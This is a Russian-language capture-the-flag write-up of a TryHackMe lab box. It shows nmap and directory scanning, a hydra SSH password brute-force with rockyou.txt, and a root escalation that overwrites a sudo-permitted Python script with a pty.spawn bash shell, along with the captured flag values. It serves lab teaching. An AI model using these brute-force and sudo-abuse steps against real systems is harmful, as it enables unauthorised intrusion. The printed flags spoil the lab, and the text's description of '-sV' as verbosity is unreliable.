@@ -1,0 +1,135 @@
+
+- https://tryhackme.com/room/bsidesgtlibrary
+
+## Разведка
+
+```
+└─$ nmap -sC -sV 10.64.146.102
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 12:44 +0300
+Nmap scan report for 10.64.146.102
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
+|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
+|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Welcome to  Blog - Library Machine
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
+
+```
+Сканируем 22 и 80 порты
+-sC - для использования стандартных скриптов
+-sV - для большей вербозности 
+
+
+
+Видем некий блог. есть имя пользователя **meliodas**
+
+
+```
+feroxbuster -u http://10.64.146.102 -x php txt html --dont-extract-links
+                                                                                               
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.1
+
+
+301      GET        9l       28w      315c http://10.64.146.102/images => http://10.64.146.102/images/
+
+```
+
+Перебираеем директории - есть /image
+
+![[Pasted image 20260102125120.png]]
+
+На robots.txt.
+
+![[Pasted image 20260102125107.png]]
+
+По итогу небольшой разведки мы имеем следующее: имя некоего пользователя **meliodas**, директорию /images и robots.txt который намекает на rockyou.txt.  Для начала попробуем подобрать пароль для ssh для пользователя **meliodas** через hydra.
+
+==rockyou.txt - простыми словами: общедоступный словарь с самыми распространенными паролями. Его используют для перебора паролей==
+
+
+## Эксплуатация
+```
+hydra -l meliodas -P rockyou.txt ssh://10.64.146.102 -t 4
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-02 13:06:05
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking ssh://10.64.146.102:22/
+[STATUS] 84.00 tries/min, 84 tries in 00:01h, 14344314 to do in 2846:06h, 4 active
+[22][ssh] host: 10.64.146.102   login: meliodas   password: iloveyou1
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-02 13:08:57
+```
+И мы узнали пароль!
+
+
+## User
+
+![[Pasted image 20260102131228.png]]
+И мы внутри!
+
+```
+meliodas@ubuntu:~$ ls
+bak.py  user.txt
+meliodas@ubuntu:~$ cat user.txt
+6d488cbb3f111d135722c33cb635f4ec
+meliodas@ubuntu:~$ 
+```
+
+
+### Root
+
+Смотрим что умеем
+
+```
+meliodas@ubuntu:~$ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+```
+
+Мы можем выполнять некий файл /home/meliodas/bak.py от имени рут. Это отлично, в python можно закинуть все что угодно!
+
+Для повышения привелегий мы будем использовать скрипт: 
+
+```
+import pty;pty.spawn("/bin/bash")
+```
+
+По сути сам скрипт не дает нам привелегий, он просто делает терминал интерактивным и все. но процесс выполнения этой команды даст нам root, тк скрипт выполняется от имени root. **Bash** станет root процессом, а я как раз в нем)
+
+Каким то образом ее надо закинуть в наш python файл и выполнить. Я удалил файл bak.py, а затем с помощью echo создал его и закинул туда скрипт
+
+```
+meliodas@ubuntu:~$ rm bak.py
+rm: remove write-protected regular file 'bak.py'? y
+meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
+meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
+root@ubuntu:~# whoami
+root
+root@ubuntu:~# cat /root/root.txt
+e8c8c6c256c35515d1d344ee0488c617
+```
+И получаем наш root флаг
+
+## Итог: почему удалось взломать?
+
+- Имя пользователя сервера соответствует имени пользователя в публичном доступе (на сайте)
+- Слабый пароль
+- Ошибка конфигурации привилегий пользователя
